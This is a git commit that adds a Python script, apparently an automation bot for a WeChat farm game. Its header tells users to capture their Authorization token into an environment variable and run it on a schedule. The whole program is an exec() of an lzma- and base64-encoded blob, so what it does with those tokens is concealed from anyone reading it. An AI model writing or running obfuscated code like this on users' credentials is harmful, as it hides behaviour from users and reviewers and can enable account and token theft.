96a98200befcd3fae236c2988056d8ee493ab978
uan7 <162408895+uan7@users.noreply.github.com>
2024-06-12 16:55:05 +0800

    如若

---
+++ 兴攀农场.py
@@ -0,0 +1,14 @@
+"""
+微信打开：http://api.0vsp.com/h5/index/scheme?id=24612XiK5nC
+变量名:xpnc
+多账号用&
+抓Authorization的值
+定时一天两次吧40 11,17 * * * 
+"""
+
+
+
+import lzma, base64
+exec(lzma.decompress(base64.b64decode('/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4APLATFdADSbSme4Ujxz98E0ClwvVjo94gxrJSFdAsFxioavJxqKKer9CGfa/0OKfG6rFO05B7oAnWzx7d+jSmpw+4wh7teGDFpcTqcym+LOWpdmNhF7lWOP+ME7wdIu19bNvKNt6DSHtrr5zWMe1rjCwnya0+4Qlmx1YK++fqFrJduEhsbSKFuFt867Z6CXLmTbP19J1lr3xnG8rXGTGtawH2UN4GRo1eojvwX3HR+aBIb49lRFl34QS8jHy18KW88U6EB90V0vBeGsa7K8hftwkzTfgbfu+wqGvE/wEC4Yq8NP3A0sCRsyklsgIcSuVRJ2Oy56E/MDRplCRlnLfA1PEV3jMDJ0/7ud2vRTUXMFP3xVqEzK4+61f/cWk+WT+BV+4Ub69ZXJYCgdbrMhKSfjVR6xwYwIAAAAANtl2fioSUjMAAHNAswHAADszTctscRn+wIAAAAABFla')))
+
+
